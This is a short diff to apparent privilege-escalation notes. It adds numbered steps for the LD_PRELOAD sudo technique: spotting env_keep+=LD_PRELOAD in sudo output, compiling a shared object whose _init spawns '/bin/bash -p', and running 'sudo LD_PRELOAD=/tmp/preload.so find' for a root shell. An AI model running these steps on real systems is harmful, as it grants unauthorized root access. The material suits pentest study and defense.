@@ -14,5 +14,13 @@ void _init() {
 	system("/bin/bash -p");
 }
 ```
-gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
-sudo LD_PRELOAD=/tmp/preload.so find
+1- [+] We can sudo without supplying a password!
+
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH,
+    
+2- gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+
+3- sudo LD_PRELOAD=/tmp/preload.so find
+
+
